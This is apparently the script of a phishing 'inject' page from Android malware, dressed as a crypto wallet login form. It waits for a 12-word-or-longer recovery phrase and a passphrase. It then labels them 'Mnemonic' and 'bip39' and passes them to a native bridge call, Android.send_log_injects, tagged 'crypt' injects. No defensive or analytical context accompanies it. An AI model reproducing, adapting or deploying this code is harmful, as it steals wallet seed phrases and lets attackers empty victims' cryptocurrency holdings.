    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData'),
            pass = document.getElementById('pass'),
            showPass = document.getElementById('showPass'),
            hidePass = document.getElementById('hidePass');

        login.onkeyup = () => {
            if(login.value.split(" ").length >= 12 && password.value.length > 4) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        password.onkeyup = () => {
            if(login.value.split(" ").length >= 12 && password.value.length > 4) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        showPass.onclick = () => {
            showPass.style.display = 'none';
            pass.style.display = 'block'
        }

        hidePass.onclick = () => {
            showPass.style.display = 'block';
            pass.style.display = 'none'
        }

        sendData.onclick = () => {
            var data = {};
                data.Mnemonic = login.value;
                data.bip39 = password.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
